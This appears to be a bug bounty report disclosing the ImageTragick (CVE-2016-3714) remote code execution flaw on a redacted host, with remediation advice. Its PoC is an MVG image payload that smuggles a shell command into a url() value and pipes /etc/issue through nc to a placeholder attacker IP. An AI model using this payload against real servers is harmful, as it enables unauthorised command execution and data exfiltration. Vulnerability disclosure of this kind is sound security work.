ImageTragick leads to RCE on xxx.xxxxxxxxxxxx.xxx



Hi,


## Description

ImageMagick is a popular software used to convert, edit and manipulate images. It has libraries for all common programming languages, including PHP, Python, Ruby and many others. 

However, the olders version of ImageMagick don’t properly filter the file names that get passed to the internal delegates that handle external protocols. This allows an attacker to execute his own commands remotely by uploading an image. This leads to a full RCE vulnerability in your image uploader.


## PoC

Use the following payload as an image:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://<attacker ip>"||/bin/bash -c "cat /etc/issue | nc -nv <attacker ip> 1111)'
pop graphic-context
```

{}


## Risk

- take control of the concerned server
- malicious code injection
- defacement
- perform pivoting to access other server in the same network
- ...


## Remediation

Check the uploaded file if it's really an image before passing the file to ImageMagick (e.g. the convert utility).
Update the system to the last version of ImageMagick (or at least a patched version).


## See also

https://imagetragick.com/  
https://blog.sucuri.net/2016/05/imagemagick-remote-command-execution-vulnerability.html  
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3714  




Best regards,

Gwen

